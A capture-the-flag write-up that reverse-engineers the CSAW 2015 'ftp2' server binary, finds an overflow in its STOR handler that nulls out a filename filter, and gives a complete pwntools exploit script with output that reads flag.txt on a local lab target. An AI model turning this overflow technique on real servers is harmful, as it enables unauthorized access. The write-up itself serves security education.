This writeup is based off of this writeup:
```
http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-exploitables-300-ftp2.html
```

So we continue off of the 300 point reversing challenge ftp. We are dealing with a 64 bit elf, that is an ftp server with basic functionallity. We only have the following basic ftp commands available:

```
user:	designate user to login as
pass:	designate password to use
help:	list available commands
port:	designate a port to listen on
pasv:	designate the server to passively listen
stor:	upload a file to the server
retr:	retrieve a file from the server
list:	list all files in the ftp server's current directorty
pwd:	prints the working directory
cwd:	changes the working directory
syst:	displayes system information
noop:	does nothing
quit:	exit the ftp server
rdf:	solve the reversing challenge
```

So continuing, we left off we were able to log in and run a command which gave us the flag. Let's see what files we have access to using the first connection:

```
$	nc 127.0.0.1 12012
Welcome to FTP server
user blankwall
Please send password for user blankwall
pass cookie
logged in
list
use port or pasv first
pasv
PASV succesful listening on port: 64774
```

so we need to establish a secondary connection to list the files:

```
$	nc 127.0.0.1 64774
```

Now list the files on the first connection

```
list
LIST complete
```

it will output the of all of the files on the secondary connection

```
drwxr-xr-x 1     0     0         4096 Jul 23 13:49 Readme.md
drwxr-xr-x 1     0     0         4096 Jul 23 13:49 exploit.py
drwxr-xr-x 1     0     0         4096 Jul 23 13:49 ftp_0319deb1c1c033af28613c57da686aa7
drwxr-xr-x 1     0     0         4096 Jul 23 13:49 flag.txt
```

the `flag.txt` file looks intersting, let's try to retrieve it

```
retr flag.txt
Invalid character specified
```

So there is an illegal character in the file name for `flag.txt`. Let's see where in the code it does the check using IDA:

```
  file_send_check = 0;
  LODWORD(input) = sub_401A03(argument, *(_QWORD *)(argument + 24));
  filename = (char *)input;
  input_check = (char *)input;
  input_len = strlen(input);
  while ( *input_check != illegal_character )
  {
    if ( !--input_len )
      break;
    ++input_check;
  }
  if ( input_check[1] )
  {
    result = send_func(*(_DWORD *)argument, "Invalid character specified\n");
  }
```

So we can see that in the function for RETR (sub_402104), that it is checking if our input contains a character stored in `illegal_character`. We can see that `illegal_character` is in the bss, and doesn't have an initial value:

```
.bss:0000000000604408 illegal_character dd ?                  ; DATA XREF: login_func+1E5w
.bss:0000000000604408                                         ; retr+67r
```

However when we check the xreferences for `illegal_character`, we can see that it is written to in the login function:

```
      send_func(*(_DWORD *)heap_struct, "logged in\n");
      illegal_character = 0x66;
```

So we can see, that when we are logged in (sub_40159b) it sets the `illegal_character` char equal to 0x66, which is hex for `f`. So the illegal character is `f`, which is in the file we need to read `flag.txt`. Let's see if we can find something in the code that will allow us to get around it.

```
  byte_count = 0;
  LODWORD(argument_struct) = sub_401A03(argument, *(_QWORD *)(argument + 24));
  argument_transfer = argument_struct;
  if ( (signed int)port_check(argument) >= 0 )
  {
    send_func(*(_DWORD *)argument, "transfer starting.\n");
    while ( 1 )
    {
      LODWORD(input) = recv(*(_DWORD *)(argument + 4), write_char, 0xAuLL, 0);
      if ( (signed int)input < 0 )
        break;
      if ( !(_DWORD)input )
        goto LABEL_8;
      byte_count += (unsigned int)input;
    }
    send_func(*(_DWORD *)argument, "error receiving file");
LABEL_8:
    printf("Storing file %s", *(_QWORD *)(argument + 24));
    write_char[(signed __int64)(signed int)byte_count] = 0;
```

We find something that can do the job in the function for the stor command (sub_401df9), either by searching through the code or finding the `write_char` char before `illegal_character` in the bss. Looking over the code, we can see that it never actually writes the file to the disk, however it scans it into memory. Note that  it only scans in ten bytes of data at a time, however the byte count isn't reset. And we can see that in order to null terminate the input, it will write zero to whatever is x bytes after `write_char` with x being equal to `byte_count`.

```
.bss:0000000000604200 ; char write_char[]
.bss:0000000000604200 write_char      db ?                    ; DATA XREF: sub_401AD7:loc_401BADo
```

Remember that `illegal_char` is after `write_char` so we will be able to write the signle null byte over the `f` character, and that should allow us to read the `flag.txt` file. First let's calculate the offset:

```
>>> 0x604408 - 0x604200
520
```

So we can see that the offset is 520 bytes, however with the newline character that we have to send in addition to the data we need to only send 519 bytes worth of data. So our exploit will essentially involve storing a file with 519 characters which will overwrite the illegal character with a null byte, then we will be able to read `flag.txt`. here is the exploit:

```
#Import pwntools
from pwn import *

#Start the server
server = process("./ftp_0319deb1c1c033af28613c57da686aa7")

#Connect to the server, and log in
target = remote("127.0.0.1", 12012)
target.recvline()
target.sendline("user blankwall")
target.recvline()
target.sendline("pass cookie")
target.recvline()

#Establish the first secondary remote connection to transfer the file
target.sendline("pasv")
p0 = target.recvline()
p0 = p0.replace("PASV succesful listening on port: ", "")
p0 = p0.replace("\n", "")
print "port 0 is: " + p0 
r0 = remote("127.0.0.1", p0)

#Transfer the file to write over the illegal character 'f'
target.sendline("stor pwn")
payload = "0"*519
r0.sendline(payload)
r0.close()
print target.recvuntil("transfer complete\n")

#Establish the secondary connection to retrieve the flag.txt file
target.sendline("pasv")
p1 = target.recvline()
p1 = p1.replace("PASV succesful listening on port: ", "")
p1 = p1.replace("\n", "")
print "port 1 is: " + p1 
r1 = remote("127.0.0.1", p1)

#Retrieve and print the flag.txt file
target.sendline("retr flag.txt")
print r1.recvline()
r1.interactive()

#Drop to an interactive prompt, and 
target,interactive()
#gdb.attach(server)
```

Let's test it:

```
$	python exploit.py 
[+] Starting local process './ftp_0319deb1c1c033af28613c57da686aa7': pid 2239
[+] Opening connection to 127.0.0.1 on port 12012: Done
port 0 is: 63663
[+] Opening connection to 127.0.0.1 on port 63663: Done
[*] Closed connection to 127.0.0.1 port 63663
transfer starting.
transfer complete

port 1 is: 64969
[+] Opening connection to 127.0.0.1 on port 64969: Done
flag{exploiting_ftp_servers_in_2015}

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

Just like that, we pwned the binary!
